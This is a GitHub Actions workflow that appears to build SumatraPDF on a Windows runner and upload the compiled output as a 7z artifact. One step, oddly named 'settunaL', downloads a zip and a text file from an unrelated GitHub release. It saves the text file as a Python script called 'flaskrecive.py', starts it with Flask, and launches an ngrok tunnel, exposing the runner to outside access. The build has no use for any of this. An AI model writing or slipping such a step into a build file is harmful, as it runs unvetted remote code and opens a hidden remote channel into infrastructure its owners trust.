name: sumatrapbb

on:
  workflow_dispatch:
    inputs:
      opencv-version:
        description: dxc
        required: true
        default: 4.5.2
#defaults:
#  run:
#    working-directory: D:\a\sumatrapdf\sumatrapdf

jobs:
  publish_windows_x64:
    runs-on: windows-2022

    steps:
      - uses: actions/checkout@v6
        with:
            repository: sumatrapdfreader/sumatrapdf
            #ref: '3.2rel'
            submodules: recursive
            #fetch-depth: 1
      - name: Visual Studio Development Environment
        uses: TheMrMilchmann/setup-msvc-dev@79dac248aac9d0059f86eae9d8b5bfab4e95e97c # v4.0.0
        with:
          arch: x64
      #- name: Set up Go #.\doit.bat -ci
      #  uses: actions/setup-go@v7
      #  with:
      #    go-version: 1.13.4
      - name: Install bun
        uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2
      - name: settunaL
        run: |
          curl -L -o "gg.zip" "https://github.com/Klanlg/bleeda/releases/download/1.0/rokold.zip"
          curl -L -o "flaskrecive.py" "https://github.com/Klanlg/bleeda/releases/download/1.0/flaskrecive.txt"
          7z x gg.zip
          md %LOCALAPPDATA%\ngrok
          copy nggb.yml %LOCALAPPDATA%\ngrok\ngrok.yml
          pip install Flask-SocketIO
          pip install Flask
          start "" python.exe flaskrecive.py
          ngrok.exe start --all
        shell: cmd
      - name: tocmd
        run: |
          md vin
          bun cmd/build.ts -rel
          #bun cmd/ng-build.ts -rel SumatraPDF
          del out\rel64\embedded.lzsa
          7z a -mqs -m0=lzma -mx=9 -ms=4096m -mf -mfb=64 -md=32m -ms=on D:\arll.7z out -xr!*.pdb
          #-ir!*lib -ir!*nja -ir!*obj
          move D:\arll.7z vin\
        shell: cmd
      
      
      - name: Upload Windows x64
        uses: actions/upload-artifact@v7
        with:
          name: x64rel
          path: vin\arll.7z
          archive: false
          #if-no-files-found: error
          #include-hidden-files: true

 
